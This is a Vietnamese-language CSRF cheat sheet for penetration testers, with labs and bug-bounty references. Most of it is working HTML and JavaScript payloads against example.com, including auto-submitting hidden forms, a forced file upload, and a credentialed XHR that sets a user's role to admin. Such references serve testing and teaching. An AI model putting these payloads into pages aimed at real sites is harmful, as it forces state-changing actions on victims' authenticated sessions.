# Giả Mạo Yêu Cầu Liên Trang (Cross-Site Request Forgery)

> Giả mạo yêu cầu liên trang (CSRF/XSRF) là một cuộc tấn công buộc người dùng cuối thực hiện các hành động không mong muốn trên một ứng dụng web mà họ đang được xác thực. Các cuộc tấn công CSRF nhắm mục tiêu cụ thể vào các yêu cầu làm thay đổi trạng thái, chứ không phải đánh cắp dữ liệu, vì kẻ tấn công không có cách nào để xem phản hồi của yêu cầu bị giả mạo. - OWASP

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)
    * [HTML GET - Yêu Cầu Tương Tác Người Dùng](#html-get---requiring-user-interaction)
    * [HTML GET - Không Cần Tương Tác Người Dùng](#html-get---no-user-interaction)
    * [HTML POST - Yêu Cầu Tương Tác Người Dùng](#html-post---requiring-user-interaction)
    * [HTML POST - Tự Động Gửi - Không Cần Tương Tác Người Dùng](#html-post---autosubmit---no-user-interaction)
    * [HTML POST - multipart/form-data Kèm Tải File - Yêu Cầu Tương Tác Người Dùng](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)
    * [JSON GET - Yêu Cầu Đơn Giản](#json-get---simple-request)
    * [JSON POST - Yêu Cầu Đơn Giản](#json-post---simple-request)
    * [JSON POST - Yêu Cầu Phức Tạp](#json-post---complex-request)
* [Bài Lab](#labs)
* [Tài Liệu Tham Khảo](#references)

## Công cụ

* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - Bộ công cụ kiểm tra và khai thác giả mạo yêu cầu liên trang hàng đầu.

## Phương pháp

![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)

Khi bạn đăng nhập vào một trang web nào đó, bạn thường có một phiên (session). Định danh của phiên đó được lưu trong một cookie trên trình duyệt của bạn, và được gửi kèm theo mọi yêu cầu tới trang web đó. Ngay cả khi một trang web khác kích hoạt một yêu cầu, cookie vẫn được gửi kèm theo yêu cầu và yêu cầu đó được xử lý như thể chính người dùng đã đăng nhập thực hiện.

### HTML GET - Yêu Cầu Tương Tác Người Dùng

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

### HTML GET - Không Cần Tương Tác Người Dùng

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - Yêu Cầu Tương Tác Người Dùng

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

### HTML POST - Tự Động Gửi - Không Cần Tương Tác Người Dùng

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

### HTML POST - multipart/form-data Kèm Tải File - Yêu Cầu Tương Tác Người Dùng

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```

### JSON GET - Yêu Cầu Đơn Giản

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST - Yêu Cầu Đơn Giản

Với XHR:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

Với biểu mẫu tự động gửi, giúp vượt qua một số cơ chế bảo vệ nhất định của trình duyệt như tùy chọn Standard của [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) trên trình duyệt Firefox:

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - Yêu Cầu Phức Tạp

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## Bài Lab

* [PortSwigger - CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [PortSwigger - CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [PortSwigger - CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [PortSwigger - CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [PortSwigger - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [PortSwigger - CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [PortSwigger - CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [PortSwigger - CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

## Tài Liệu Tham Khảo

* [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3, 2016](https://web.archive.org/web/20220926223539/https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
* [Cross-Site Request Forgery (CSRF) - OWASP - April 19, 2024](https://web.archive.org/web/20120920091432/https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton - July 26, 2015](https://web.archive.org/web/20170919181010/https://whitton.io/articles/messenger-site-wide-csrf/)
* [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial - July 19, 2016](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
* [Hacking PayPal Accounts with one click (Patched) - Yasser Ali - October 9, 2014](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
* [Add tweet to collection CSRF - Vijay Kumar (indoappsec) - November 21, 2015](https://web.archive.org/web/20250519092910/https://hackerone.com/reports/100820)
* [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd - October 16, 2015](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
* [How I Hacked Your Beats Account? Apple Bug Bounty - Aaditya Purani (@aaditya_purani) - July 20, 2016](https://web.archive.org/web/20250504102847/https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
* [FORM POST JSON: JSON CSRF on POST Heartbeats API - Eugene Yakovchuk - July 2, 2017](https://web.archive.org/web/20180102010752/https://hackerone.com/reports/245346)
* [Hacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjkovic - January 15, 2018](https://web.archive.org/web/20260208211335/https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
* [Cross Site Request Forgery (CSRF) - Sjoerd Langkemper - January 9, 2019](https://web.archive.org/web/20250906213239/https://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
* [Cross-Site Request Forgery Attack - PwnFunction - April 5, 2019](https://web.archive.org/web/20251127000352/https://www.youtube.com/watch?v=eWEgUcHPle0)
* [Wiping Out CSRF - Joe Rozner - October 17, 2017](https://web.archive.org/web/20250727045637/https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
* [Bypass Referer Check Logic for CSRF - hahwul - October 11, 2019](https://web.archive.org/web/20250719144921/https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)
